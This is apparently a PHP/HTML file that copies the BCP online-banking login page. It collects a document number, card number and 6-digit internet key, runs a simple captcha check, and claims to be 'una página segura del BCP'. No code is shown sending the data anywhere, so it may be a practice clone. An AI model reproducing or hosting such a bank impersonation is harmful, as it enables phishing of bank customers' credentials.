<?php
session_start();


    
if(isset($_POST['submit'])){
    // Verificar el valor del captcha
    if($_POST['captcha_code'] == $_SESSION["captcha_code"]){
        $message = '<p id="msg">correco</p>';
        
    }else{
        // Captcha es incorrecto
        $message = '<p id="msg">Incorreco</p>';
    }
}
    
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>

    <link rel="stylesheet" type="text/css" href="css/style.css">    

    <title>Document</title>
</head>

<body>
    <div class="container-fluid sinpadding">
        <div  class="row m-altura">
            <div class="col-md-6 img-fondo">
                
            </div>
            <div class="col-md-6">
                
                <h3 class="fw-bold text-center pt-5 mb-5">Banca por Internet</h3>
                <!-- Formulario -->
                <form action="#" method="post" novalidate class="form-padre" id="formulario">
                    <div class="opciones">
                        
                        <label><input type="radio" name="bcp" id="persona" value="personas" checked>  Persona</label>
                        <label><input type="radio" name="bcp" id="empresa" value="empresas"> Empresa</label>
                    </div>
                    <div class="Documentos">
                        <select name="DNI"  id="documentos form-control" class="form-select    selec-docu">
                            <option value="dni">DNI</option>
                            <option value="ce">CE</option>
                            <option value="pas">PAS</option>
                        </select>
                        
                        <input type="text" class="form-control ancho-input" name="numeroDocumento" id="">
                        
                    </div>


                    <div class="mb-4">
                        <label for="numeroTarjeta" class="form-label">Número de tarjeta</label>
                        <input type="text" class="form-control ancho-input label-input" name="numeroTarjeta" id="numeroDocumento">
                    </div>

                    <div class="my-3">
                        <a href="#">No tengo clave</a>
                        <a href="#">Olvide mi clave</a>
                    </div>

                    <div class="mb-4 form-check">
                        <input type="checkbox" name="recordar" class="form-check-input">
                        <label for="recordar" class="form-check-label">Mantenerme conectado</label>

                    </div>
                    <div class="mb-4">
                        <label for="Clave" class="form-label">Clave de internet de 6 dígitos</label>
                        <input type="Clave" class="form-control ancho-input label-input" name="Clave">
                    </div>
                    <div class="form-group">
                        <p>Captch Code</p>   
                        <img src="captcha_gen.php" />
                        <input type="text" name="captcha_code" class="form-control" autocomplete="off"/>
                        <a href="" id="cl">Cambiar</a>
                        <?php  
                            if(isset($message)){
                                echo $message;
                            }                                
                                
                            session_unset();
                             ?></p>
                    </div>

                    <div class="d-grid">
                        <input type="submit" name='submit' value="continuar" id="st" class="btn btn-primary"/>        
                        <p id="show" style="text-align:center;">

                    </div>
                    <p> lock
                        Esta es una página segura del BCP. Si tienes dudas sobre la autenticidad de la web, comunícate
                        con nosotros al 311-9898 o a través de nuestros medios digitales.</p>
                </form>
            </div>
        </div>
    </div>
    <script>

                   
        $(document).ready(function(){
            $("#st").on('click',function(){
                $("#msg").css('display','block');
                       
            });
            $("#cl").on('click',function(){    
                location.reload();
            });
        });
    </script>
    <script src="js/main.js"></script>

</body>

</html>